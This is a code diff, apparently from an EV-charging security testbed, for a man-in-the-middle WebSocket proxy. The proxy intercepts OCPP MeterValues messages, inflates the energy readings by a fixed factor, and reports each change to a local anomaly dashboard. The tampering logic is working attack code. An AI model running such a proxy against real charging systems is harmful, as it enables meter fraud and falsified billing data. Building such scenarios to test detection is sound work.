@@ -1,12 +1,14 @@
 """
-Anomali Senaryosu #4: MeterValues Poisoning (Energy Manipulation)
-MitM Proxy kullanarak sayaç verilerini (MeterValues) manipüle etme.
+Anomali Senaryosu #7: Sensor Data Poisoning (MP Poisoning)
+MitM Proxy kullanarak sayaç verilerini (MeterValues) manipüle etme ve Dashboard'a raporlama.
 """
 
 import asyncio
 import logging
 import json
 import argparse
+import time
+import requests
 from typing import Dict, Any, Optional
 from datetime import datetime
 import websockets
@@ -109,23 +111,25 @@ logger = logging.getLogger("MitM-Scenario7")
 class MitMProxy:
     """
     Scenario #7 için özelleştirilmiş MitM Proxy.
-    MeterValues mesajlarını zehirler.
+    MeterValues mesajlarını zehirler ve Dashboard API'ye raporlar.
     """
     
     def __init__(self,
                  proxy_port: int = 9023,
                  target_host: str = 'localhost',
                  target_port: int = 9000,
-                 poisoning_factor: float = 1.05):
+                 poisoning_factor: float = 1.05,
+                 api_url: str = "http://localhost:8000/api/alerts"):
         self.proxy_port = proxy_port
         self.target_host = target_host
         self.target_port = target_port
         self.poisoning_factor = poisoning_factor
+        self.api_url = api_url
         self.running = False
         
     async def start(self):
         self.running = True
-        logger.info(f"🎭 MitM Proxy (Scenario #4) başlatılıyor: Port {self.proxy_port}")
+        logger.info(f"🎭 MitM Proxy (Scenario #7) başlatılıyor: Port {self.proxy_port}")
         logger.info(f"🧪 Zehirleme Oranı: x{self.poisoning_factor} (+%{(self.poisoning_factor-1)*100:.0f})")
         
         async with websockets.serve(self.handle_client, '0.0.0.0', self.proxy_port):
@@ -171,7 +175,6 @@ class MitMProxy:
             
             if isinstance(msg_json, list) and len(msg_json) == 4:
                 action = msg_json[2]
-                payload = msg_json[3]
                 
                 if action == "MeterValues":
                     logger.warning("📥 [YAKALANDI] MeterValues mesajı tespit edildi")
@@ -188,6 +191,8 @@ class MitMProxy:
         try:
             payload = msg_json[3]
             modified = False
+            original_rp = 0
+            poisoned_rp = 0
             
             # Payload yapısını gez: meterValue -> sampledValue -> value
             if 'meterValue' in payload:
@@ -202,15 +207,41 @@ class MitMProxy:
                                 sv['value'] = str(poisoned_val) # OCPP string bekler
                                 modified = True
                                 
+                                original_rp = original_val
+                                poisoned_rp = poisoned_val
+                                
                                 logger.warning(f"💉 [ZEHİRLENDİ] {original_val} -> {poisoned_val:.2f}")
             
             if modified:
+                # Dashboard'a alert gönder
+                self.send_alert_to_dashboard(original_rp, poisoned_rp)
                 return json.dumps(msg_json)
             return json.dumps(msg_json)
             
         except Exception as e:
             logger.error(f"⚠️ Zehirleme Hatası: {e}")
             return json.dumps(msg_json)
+
+    def send_alert_to_dashboard(self, original, poisoned):
+        """Dashboard'da görünmesi için API'ye alert gönder"""
+        try:
+            alert_data = {
+                "alert_id": f"SDP-{int(time.time()*1000)}",
+                "timestamp": time.time(),
+                "severity": "HIGH",
+                "alert_type": "Sensor Data Poisoning",
+                "description": f"MeterValues manipülasyonu: {original}Wh -> {poisoned:.2f}Wh (Ratio: {self.poisoning_factor})",
+                "source": "Scenario #7 Proxy",
+                "data": {
+                    "original_value": original,
+                    "poisoned_value": poisoned
+                }
+            }
+            # Timeout ekleyerek API kapalıysa takılmasını engelliyoruz
+            requests.post(self.api_url, json=alert_data, timeout=1)
+        except Exception:
+            # API kapalıysa simulation durmasın, sessizce devam et
+            pass
 
 
 # --- TEST FONKSİYONU ---
@@ -255,6 +286,12 @@ if __name__ == "__main__":
     
     if args.run_proxy:
         try:
+            # Gerekli paket kontrolü
+            try:
+                import requests
+            except ImportError:
+                print("UYARI: 'requests' kütüphanesi eksik. 'pip install requests' çalıştırın.")
+            
             asyncio.run(MitMProxy().start())
         except KeyboardInterrupt:
             print("\n🛑 Proxy durduruldu.")
